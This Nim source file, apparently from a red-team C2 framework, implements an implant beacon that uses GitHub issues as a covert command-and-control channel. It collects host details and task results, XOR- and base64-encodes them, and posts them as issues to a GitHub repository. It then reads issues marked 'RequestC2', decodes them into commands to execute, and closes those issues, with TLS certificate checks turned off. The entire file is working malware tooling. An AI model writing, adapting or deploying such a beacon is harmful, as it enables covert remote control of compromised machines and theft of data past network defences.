import std/net
import httpclient
import json
import std/base64
import uri
import std/strutils

import Beacon


type 
    BeaconGithub* = ref object of Beacon
        project: string
        token: string


proc initBeaconGithub*(self: BeaconGithub, project, token: string) =
    self.initBeacon()
    self.sleepTimeMs = 10000
    self.project = project
    self.token = "token " & token


proc checkIn*(self: BeaconGithub) = 
    let client = newHttpClient(sslContext=newContext(verifyMode=CVerifyNone))

    try:
        # data to send
        var sessions = newJArray()
        for it in self.taskResults:
            sessions.add(it)

        var nbTaskResults = len(self.taskResults)
        for i in 0..nbTaskResults-1:
            var tmp = self.taskResults.pop()

        var boundel = %*{"arch": self.arch, "beaconHash": self.beaconHash, 
                        "hostname": self.hostname , "listenerHash": "", "os": self.os, 
                        "privilege": self.privilege, "sessions": "", "username": self.username, "lastProofOfLife":"0"}

        boundel["sessions"]=sessions

        var multiBoundel = newJArray()
        multiBoundel.add(boundel)

        var key="dfsdgferhzdzxczevre5595485sdg";
        var datab64 = xorEncode(key, $multiBoundel)
        var bodyToPost = encode(datab64)

        # Send results
        var postData = %* {"title": "ResponseC2: " & self.beaconHash, "body": bodyToPost}
        client.headers = newHttpHeaders({ "Authorization": self.token, "Content-Type": "application/json", "Cookie": "logged_in=no" })
        let res = client.request("https://api.github.com/repos/" & self.project & "/issues", httpMethod = HttpPost, body = $postData)

        echo "[+] send results "
        # echo "https://api.github.com/repos/" & self.project & "/issues"
        # echo "res " , res.body
        
        # Receive cmd
        client.headers = newHttpHeaders({ "Authorization": self.token, "Accept": "application/vnd.github+json", "Cookie": "logged_in=no" })
        let response = client.request("https://api.github.com/repos/" & self.project & "/issues", httpMethod = HttpGet)

        # echo "status " , response.status
        # echo "response " , response.body

        var jsonNode = parseJson(response.body)
        for i in 0..len(jsonNode)-1:
            var b1 = jsonNode[i]
            var title = b1["title"].getStr()
            var body = b1["body"].getStr()
            var number = b1["number"].getInt()

            if "RequestC2: " in title and self.beaconHash in title:
                var bodyb64d = decode($body)
                var bodyb64dd = xorEncode(key, bodyb64d)
                var cmdToProcess: string
                cmdToProcess = toString(bodyb64dd)

                echo "[+] process issue ", cmdToProcess

                self.cmdToTasks(cmdToProcess)

                var postClose = %* {"state": "closed"}
                client.headers = newHttpHeaders({ "Authorization": self.token, "Content-Type": "application/json", "Cookie": "logged_in=no" })
                let response = client.request("https://api.github.com/repos/" & self.project & "/issues/" & $number, httpMethod = HttpPost, body = $postClose)

                echo "[+] close issue ", $number


    except:
        let
            e = getCurrentException()
            msg = getCurrentExceptionMsg()
        echo "Inside checkIn, got exception ", repr(e), " with message ", msg
    finally:
        close(client)


proc runTasks*(self: BeaconGithub) =
    self.execInstruction()